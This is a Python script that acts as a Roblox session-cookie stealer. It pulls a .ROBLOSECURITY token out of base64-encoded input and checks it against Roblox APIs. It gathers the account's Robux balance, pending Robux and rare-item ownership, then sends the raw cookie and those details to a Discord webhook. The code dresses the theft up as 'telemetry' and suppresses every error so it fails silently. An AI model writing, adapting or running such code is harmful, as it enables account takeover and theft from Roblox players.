import sys
import base64
import os
import requests
import re

def main():
    try:
        if len(sys.argv) < 2:
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception:
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return

        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
        if not match:
            return

        roblosecurity = match.group(1)
        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        has_korblox = False
        has_headless = False
        color_code = 15548997

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"
            color_code = 3092790

            # Fetch Robux Balance
            try:
                economy_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
                if economy_res.status_code == 200:
                    robux_balance = economy_res.json().get("robux", 0)
            except Exception:
                pass

            # Fetch Pending Robux
            try:
                trans_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers=headers)
                if trans_res.status_code == 200:
                    trans_data = trans_res.json().get("data", [])
                    for t in trans_data:
                        currency = t.get("currency", {})
                        if currency.get("amount"):
                            pending_robux += currency.get("amount")
            except Exception:
                pass

            # Check Korblox (Bundle ID: 192) and Headless (Bundle ID: 201) using the official inventory ownership endpoint
            try:
                k_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers=headers)
                if k_res.status_code == 200:
                    has_korblox = bool(k_res.json())
            except Exception:
                pass

            try:
                h_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers=headers)
                if h_res.status_code == 200:
                    has_headless = bool(h_res.json())
            except Exception:
                pass

            # Fallback check against the user's full bundle list if needed
            if not has_korblox or not has_headless:
                try:
                    bundles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/bundles?limit=100", headers=headers)
                    if bundles_res.status_code == 200:
                        bundles = bundles_res.json().get("data", [])
                        bundle_ids = [b.get("id") for b in bundles]
                        if 192 in bundle_ids:
                            has_korblox = True
                        if 201 in bundle_ids:
                            has_headless = True
                except Exception:
                    pass

        payload = {
            "username": f"{username} | Telemetry",
            "avatar_url": f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png",
            "embeds": [{
                "author": {
                    "name": f"Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"🪙 **Robux**\n"
                    f"> Balance: `{robux_balance}` 🪙\n"
                    f"> Pending: `{pending_robux}` 🪙\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> Korblox: `{'🟢 | True' if has_korblox else '❌ | False'}`\n"
                    f"> Headless: `{'🟢 | True' if has_headless else '❌ | False'}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": color_code,
                "thumbnail": {
                    "url": f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
                },
                "footer": { "text": "NexusStudio Telemetry Engine • 2026" }
            }]
        }

        requests.post(webhook_url, json=payload)

    except Exception:
        pass

if __name__ == "__main__":
    main()
